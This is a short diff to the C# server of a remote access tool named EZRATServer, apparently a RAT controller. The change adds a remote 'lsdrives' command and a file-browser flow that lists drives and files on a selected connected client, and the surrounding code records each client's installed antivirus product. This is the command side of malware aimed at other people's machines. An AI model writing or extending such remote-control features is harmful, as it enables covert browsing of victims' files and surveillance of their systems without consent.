@@ -290,14 +290,15 @@ namespace EZRATServer
         }
 
 
-        void RightClickSelect(object sender, EventArgs e)
+        void RightClickSelect(object sender, ToolStripItemClickedEventArgs e)
         {
-            ContextMenuStrip item = (ContextMenuStrip)sender;
-            switch (item.Items[0].Text)
+            
+            switch (e.ClickedItem.Text)
             {
                 case "File Browser":
-                    fl = new FileBrowser();
+                    fl = new FileBrowser(this,this.lstClients.SelectedItems[0].Index);
                     fl.Show();
+                    SendCommand("lsdrives", this.lstClients.SelectedIndices[0]);
                     SendCommand("lsfiles",this.lstClients.SelectedIndices[0]);
                     break;
                 case "Chat":
@@ -500,7 +501,8 @@ namespace EZRATServer
         }
 
 
-        private void SendCommand(string command, int targetClient)
+
+        public void SendCommand(string command, int targetClient)
         {
             try
             {
@@ -611,6 +613,12 @@ namespace EZRATServer
                         string windows = lines[3]; //The computer's installed Anti Virus product
 
                         AddToData(new ClientData(id, ip, name, user,windows)); //Update the UI
+                    }
+                    else if (text.StartsWith("lsdrives;"))
+                    {
+                        string[] mainContainer = text.Split(';'); // Get the main data parts
+                        string[] lines = mainContainer[1].Split('¦'); //Split the data into parts
+                        fl.UpdateDrives(lines);
                     }
                     else if (text.StartsWith("lsfiles;"))
                     {
